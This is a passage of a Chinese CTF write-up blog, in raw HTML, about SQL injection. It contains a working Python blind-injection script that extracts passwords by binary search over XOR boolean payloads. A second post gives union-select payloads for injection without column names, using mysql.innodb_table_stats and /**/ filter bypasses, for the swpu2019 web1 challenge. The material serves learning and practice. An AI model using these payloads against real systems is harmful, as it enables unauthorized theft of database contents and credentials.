-          <h1 id="第一次写盲注脚本"><a href="#第一次写盲注脚本" class="headerlink" title="第一次写盲注脚本"></a>第一次写盲注脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">280</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        url = <span class="string">&quot;http://5ab2fc5d-f744-4401-9552-f1b496e7e678.node4.buuoj.cn:81/search.php&quot;</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查库</span></span><br><span class="line">        <span class="comment">#payload =&quot;?id=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查列</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查表</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查字段</span></span><br><span class="line">        payload= <span class="string">&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#查password</span></span><br><span class="line">        url+=payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Cl&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print(chr(mid))</span></span><br><span class="line">    flag += <span class="built_in">chr</span> (mid)</span><br><span class="line">    <span class="comment">#print(mid)</span></span><br><span class="line">    <span class="comment">#print(chr(mid))</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="总结步骤"><a href="#总结步骤" class="headerlink" title="总结步骤"></a>总结步骤</h1><ol>
-<li>fuzz查过滤</li>
-<li>考虑查注入</li>
-<li>然后写脚本</li>
-</ol>
-<p><img src="https://i.loli.net/2021/11/19/n5blAoWmT41eLUJ.png" alt="QQ截图20211119210158.png"></p>
-<p>根据提示，尝试对？id=进行fuzz</p>
-<p>发现空格和and和||和$$被过滤了</p>
-<p>而^没有被过滤</p>
-<p>尝试用1^^1</p>
-<p><img src="https://i.loli.net/2021/11/19/dH3Y57PkpW9xgLF.png" alt="QQ截图20211119211628.png"></p>
-<p>可以利用可行的注入符合提供思路</p>
-<p>“1^ 0 ^ 1”为假</p>
-<p>“1 ^ 1 ^ 1”为真来嵌套语句</p>
-<h1 id="利用二分法来简化爆破"><a href="#利用二分法来简化爆破" class="headerlink" title="利用二分法来简化爆破"></a>利用二分法来简化爆破</h1><p>32是空格，ascii最多到127，所以可显字符是32到127</p>
-<p>我们取中间数为mid为80，high为128，low为32（方便除二）</p>
-<p>若这个要猜的值比80大，就到80到128的区间类取中值比较，以此类推，因为这个数必是整数，所以必可以找到。</p>
-<p><img src="https://i.loli.net/2021/11/19/CFx2wMBOHc5yViq.png" alt="QQ截图20211119212958.png"></p>
-<p>最后在一大堆password里面找到。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="发福的小菜狗">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wds">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">无列名注入</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-11-14 21:04:50" itemprop="dateCreated datePublished" datetime="2021-11-14T21:04:50+08:00">2021-11-14</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-11-16 22:27:38" itemprop="dateModified" datetime="2021-11-16T22:27:38+08:00">2021-11-16</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="sql注入之无名注入"><a href="#sql注入之无名注入" class="headerlink" title="sql注入之无名注入"></a>sql注入之无名注入</h1><p>在我们进行sql注入的时候，有时候information_schema这个库可能会因为过滤而无法调用，这时我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：</p>
-<p>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722/article/details/109605941">文章截取csdn</a></p>
-<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>指已经被存入数据库的值被误解读为错误指令。</p>
-<p>一般出现在读取值的过程中有各种过滤，然后对读取数据库时不进行过滤或转义。</p>
-<h1 id="swpu2019-web1"><a href="#swpu2019-web1" class="headerlink" title="[swpu2019]web1"></a>[swpu2019]web1</h1><p>先注册账号</p>
-<p>然后就可以上传广告（上传广告就是把值存入数据库）</p>
-<p>然后分别测试在广告名和广告内容注入，发现广告名可以注入，但是有很多的过滤。</p>
-<p><img src="https://i.loli.net/2021/11/14/Zke9TQvxtF2W4mg.png" alt="QQ截图20211114220531.png"></p>
-<p>用/**/来代替空格，利用union select 查出字段数和回显</p>
-<p><img src="https://i.loli.net/2021/11/14/vIu7FfEXd65pyJQ.png" alt="QQ截图20211114222329.png"></p>
-<p>发现2，3位置回显，</p>
-<p><img src="https://i.loli.net/2021/11/14/pw2KetuCxYDmOL7.png" alt="QQ截图20211114222514.png"></p>
-<p>查库</p>
-<p><img src="https://i.loli.net/2021/11/14/B3xUqzE9JAVnvfl.png" alt="QQ截图20211114223621.png"></p>
-<p>查表（出现没有）</p>
-<p><img src="https://i.loli.net/2021/11/14/7n9YZdX4VzyxeaA.png" alt="QQ截图20211114223712.png"></p>
-<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name)/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/table.schema=database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1</p>
-<p>这里的information_schema被过滤了不能用，所以我们要换一个库来查table_name和column_name</p>
-<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/<strong>/from/</strong>/mysql.innodb_table_stats/<strong>/where/</strong>/database_name=database()&amp;&amp;’1’=’1</p>
-<p>但是这个引擎没有存列名</p>
-<p>所以要利用无列名注入。</p>
-<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/<strong>/from/</strong>/mysql.innodb_table_stats/<strong>/where/</strong>/database_name=database()&amp;&amp;’1’=’1</p>
-<p>用mysql.innodb_table_stats代替information_schema.tables查出表</p>
-<p><img src="https://i.loli.net/2021/11/16/kJuyev3L5zHcio8.png" alt="QQ截图20211116221604.png"></p>
-<p>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>2</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select*from/</strong>/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1</p>
-<p><img src="https://i.loli.net/2021/11/16/siyhoeba1frqQL3.png" alt="QQ截图20211116222056.png"></p>
-<p>查询</p>
-<p>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>3</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select*from/</strong>/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1’</p>
-<p><img src="https://i.loli.net/2021/11/16/Nbk9mvRZyiJg5t6.png" alt="QQ截图20211116222453.png"></p>
 
       
     </div>
